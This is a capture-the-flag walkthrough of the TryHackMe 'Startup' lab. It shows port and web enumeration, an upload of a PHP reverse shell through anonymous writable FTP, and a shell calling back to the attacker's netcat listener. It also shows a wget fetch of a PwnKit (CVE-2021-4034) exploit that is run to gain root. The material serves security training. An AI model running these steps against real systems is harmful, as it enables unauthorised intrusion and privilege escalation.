### Startup (Easy)
https://tryhackme.com/room/startup

## Enum
```
./rustscan -a 10.10.6.26
```
```
Open 10.10.6.26:21
Open 10.10.6.26:22
Open 10.10.6.26:80
```
```
nmap -p 21,22,80 10.10.6.26 -Pn -sC -sV -T4 -A
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.8.95.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Jul 10 08:16 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
```
ffuf -u http://10.10.6.26/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 40
```
```

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.6.26/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 551ms]
.htaccess               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 533ms]
.htpasswd               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 613ms]
files                   [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 294ms]
index.html              [Status: 200, Size: 808, Words: 136, Lines: 21, Duration: 295ms]
server-status           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 357ms]
:: Progress: [4712/4712] :: Job [1/1] :: 108 req/sec :: Duration: [0:00:40] :: Errors: 0 ::
'''
```
![image](https://user-images.githubusercontent.com/6504854/178138207-ea1c56fb-5e5f-46e0-aed2-53078beb809c.png)

```
ftp
ftp> open 10.10.6.26
Connected to 10.10.6.26.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||28627|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> cd ftp
250 Directory successfully changed.
ftp> send 1.php 2.php
local: 1.php remote: 2.php
229 Entering Extended Passive Mode (|||48727|)
150 Ok to send data.
100% |*******************************************************************************************|  3643       14.41 MiB/s    00:00 ETA
226 Transfer complete.
3643 bytes sent in 00:00 (5.26 KiB/s)
ftp>
```
```
php.1 is php Rev-Shell
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
```
```
nc -lnvp 4444
```
```
curl http://10.10.6.26/files/ftp/2.php
```
```
nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.6.26] 57750
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 09:07:27 up 10 min,  0 users,  load average: 0.16, 0.38, 0.39
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

python3 -c "import pty;pty.spawn('/bin/bash')"

www-data@startup:/$ ls -la /usr/bin/pkexec
ls -la /usr/bin/pkexec
-rwsr-xr-x 1 root root 23376 Mar 27  2019 /usr/bin/pkexec
```
🏴 -rwsr-xr-x

```
www-data@startup:/$ cd tmp
wget 10.10.10.10/poc.tar
```
poc.tar is CVE-2021-4034 exploit(Polkit)

```
Saving to: 'poc.tar'

poc.tar             100%[===================>] 230.00K  78.9KB/s    in 2.9s

2022-07-10 08:36:10 (78.9 KB/s) - 'poc.tar' saved [235520/235520]

www-data@startup:/tmp$ ls
www-data@startup:/tmp$ tar -xvf poc.tar
tar -xvf poc.tar
CVE-2021-4034/
CVE-2021-4034/GCONV_PATH=./
CVE-2021-4034/GCONV_PATH=./pwnkit.so:.

www-data@startup:/tmp/CVE-2021-4034$ ./cve-2021-4034
./cve-2021-4034
# whoami
whoami
root
```

:ramen: あじをしめている…（きちんと力がつかないのでよくない）。(喪version)

